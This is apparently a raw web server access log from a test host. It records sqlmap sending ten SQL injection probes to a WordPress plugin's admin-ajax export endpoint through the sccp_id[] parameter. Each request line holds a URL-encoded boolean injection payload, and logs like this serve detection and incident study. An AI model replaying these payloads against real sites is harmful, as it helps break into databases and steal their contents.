1
192.168.59.217 - - [21/Apr/2022:12:37:04 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%27%29%20AND%203979%3D3587%20AND%20%28%27apkw%27%3D%27apkw&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:04 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%27%29%29%20AND%206448%3D5239%20AND%20%28%28%27MyZP%27%3D%27MyZP&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:04 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%27%29%29%29%20AND%208056%3D9183%20AND%20%28%28%28%27CrTA%27%3D%27CrTA&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:04 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%27%20AND%202011%3D6522%20AND%20%27rCbe%27%3D%27rCbe&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:04 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%27%29%20AND%201509%3D3826%20AND%20%28%27NzYn%27%20LIKE%20%27NzYn&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:04 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%27%29%29%20AND%209336%3D8643%20AND%20%28%28%27MSvR%27%20LIKE%20%27MSvR&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:04 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%27%29%29%29%20AND%203649%3D5607%20AND%20%28%28%28%27wqAa%27%20LIKE%20%27wqAa&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:04 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%25%27%20AND%207135%3D2802%20AND%20%27ykzc%25%27%3D%27ykzc&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:04 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%27%20AND%203586%3D9911%20AND%20%27kolT%27%20LIKE%20%27kolT&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:05 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%22%29%20AND%204466%3D9660%20AND%20%28%22oDsM%22%3D%22oDsM&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
